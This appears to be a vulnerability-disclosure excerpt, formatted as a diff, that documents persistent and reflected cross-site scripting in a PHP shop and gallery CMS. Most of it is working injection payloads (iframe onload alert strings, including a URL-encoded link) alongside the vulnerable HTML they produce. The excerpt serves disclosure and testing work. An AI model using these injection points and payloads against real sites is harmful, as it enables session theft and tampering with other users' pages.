@@ -1,0 +1,57 @@
+persistent input validation vulnerabilities:
+
+URL: http://www.example.com:8080/genium/kontakt-1.php5
+
+Module: Article Listing & Add [SELL] - Artikelnummer, Bezeichnung & Preis
+
+<form name="formArticle6" method="post" action="index.php5?site=basket"><input name="artikelnummer" value="" 
+type="hidden"><iframe src="a" onload='alert("VL")' <"=""><input name="bezeichnung" type="hidden" value="&
+quot;><iframe src=a onload=alert("VL") <"><input name="preis" 
+type="hidden" value=""><iframe src=a onload=alert("VL") <"/><input name="stamp" type="hidden" 
+value="1334501982"/><table border = "0" width="auto" CELLPADDING=0 CELLSPACING=0><tr><
+td width="100%"><strong><nobr>Fr. 0.00   </nobr></strong>
+</td>
+
+
+URL: http://www.example.com:8080/genium/galerie.php5#
+
+Module:  Umfrage - Questions & Answers
+
+<p class="title2">"><iframe src="a" onload='alert("VL")' <<="" p="">
+<FORM ACTION="galerie.php5#2" METHOD=post NAME=pollform>
+<TABLE WIDTH=50% cellspacing="0" cellpadding="0" border="0">
+<TR>
+<TD>
+<input name='pollsModuleID' type='hidden' size='50' maxlength='50' value='2'>
+<input type=radio name=question value='1'/>">
+<iframe src=a onload=alert("VL") <<br><
+input type=radio name=question value='2'/>"><iframe src=a onload=alert("VL") <<br>
+
+
+cross site scripting vulnerabilities:
+
+http://www.example.com:8080/genium/galerie.php5?moduleID=1&itemID=%22%3E%3Ciframe%20src=a%20onload=
+alert%28%22VL%22%29%20%3C&menuItemID=-1&moduleRenderType=solo
+
+Review: Listing
+
+<a href="index.php5?site=basket" class="menX">Warenkorb (1)</a><a class="menX" href="index.php5
+?site=basketform">Bestellformular</a><a href="/galerie.php5?moduleID=1&itemID=%22%3E%3Ciframe%20src=
+a%20onload=alert(%22VL%22)%20%3C&menuItemID=-1&moduleRenderType=solo&print" class="menX" target="_blank" >Drucken</a>   
+  
+
+... or
+
+<a class="xmenu" href="#" onclick="window.open('./xyloz/modules/photoalbum/photoalbum.editor.module.php5?
+
+func=itemEdit&moduleXMLFile=1290873449_photoalbum.xml&itemID="><iframe src=a onload=alert("VL") <','mywindow',
+'resizable=yes,scrollbars=off,width=740,height=550')" onmouseover='addValue("menu927297");' onmouseout='
+subValue("menu927297");'><img src="./xyloz/images/xedit.gif" class="img" border="0">  bearbeiten</a>
+<a class="xmenu" href="#" onclick="window.open('./xyloz/modules/photoalbum/photoalbum.editor.module.php5?
+
+func=itemDelete&moduleXMLFile=1290873449_photoalbum.xml&itemID="><iframe src=a onload=alert("VL") 
+
+<&site=galerie','mywindow','resizable=yes,scrollbars=off,width=740,height=550')" onmouseover='addValue("menu927297");' 
+onmouseout='subValue("menu927297");'><img src="./xyloz/images/xdel.gif" class="img" border="0">  löen</a>
+</div>
+
